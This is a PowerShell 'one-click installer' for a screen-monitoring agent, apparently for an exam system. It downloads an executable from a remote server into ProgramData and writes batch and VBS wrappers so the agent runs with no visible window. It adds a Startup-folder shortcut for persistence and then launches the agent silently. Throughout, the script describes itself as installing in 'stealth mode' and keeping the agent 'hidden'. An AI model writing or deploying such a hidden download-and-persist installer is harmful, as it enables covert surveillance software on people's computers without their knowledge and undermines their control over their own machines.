# Screen Frog Agent - Remote One-Click Installer
# This script DOWNLOADS, INSTALLS, and PERSISTS the agent in stealth mode.

# --- CONFIGURATION ---
$ServerUrl   = "https://exam-system-v1.onrender.com"
$DownloadUrl = "$ServerUrl/download/agent"
$InstallDir  = "C:\ProgramData\ScreenFrog"
$AgentExe    = "seb_agent_v3.exe"
$TargetPath  = Join-Path $InstallDir $AgentExe

Write-Host "[*] Initializing Stealth Installation..." -ForegroundColor Cyan

# 1. Create Installation Directory
if (!(Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# 2. Download Agent Executable
Write-Host "[*] Downloading agent payload..." -ForegroundColor Yellow
try {
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $TargetPath -ErrorAction Stop
    Write-Host "[+] Download complete: $TargetPath" -ForegroundColor Green
} catch {
    Write-Host "[!] Failed to download agent: $($_.Exception.Message)" -ForegroundColor Red
    pause
    exit
}

# 3. Create Stealth Launchers (run_hidden.bat)
$BatContent = "@echo off`nstart /b """" ""$TargetPath""`nexit"
$BatContent | Out-File -FilePath "$InstallDir\run_hidden.bat" -Encoding ascii

# 4. Create Silent Script (run_silent.vbs)
$VbsContent = "Set WshShell = CreateObject(""WScript.Shell"")`nWshShell.Run Chr(34) & ""$InstallDir\run_hidden.bat"" & Chr(34), 0`nSet WshShell = Nothing"
$VbsContent | Out-File -FilePath "$InstallDir\run_silent.vbs" -Encoding ascii

# 5. Persistence: Add to Windows Startup
$WshShell = New-Object -ComObject WScript.Shell
$StartupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
$Shortcut = $WshShell.CreateShortcut([System.IO.Path]::Combine($StartupPath, 'ScreenFrogAgent.lnk'))
$Shortcut.TargetPath = "$InstallDir\run_silent.vbs"
$Shortcut.WorkingDirectory = "$InstallDir"
$Shortcut.Save()
Write-Host "[+] Persistence established (Startup)." -ForegroundColor Green

# 6. Silent Execution
Write-Host "[*] Launching agent in background..." -ForegroundColor Cyan
Start-Process "wscript.exe" -ArgumentList "`"$InstallDir\run_silent.vbs`""

Write-Host "`n[SUCCESS] Screen Frog is now active and hidden." -ForegroundColor Green
Write-Host "You can close this window."
timeout /t 5
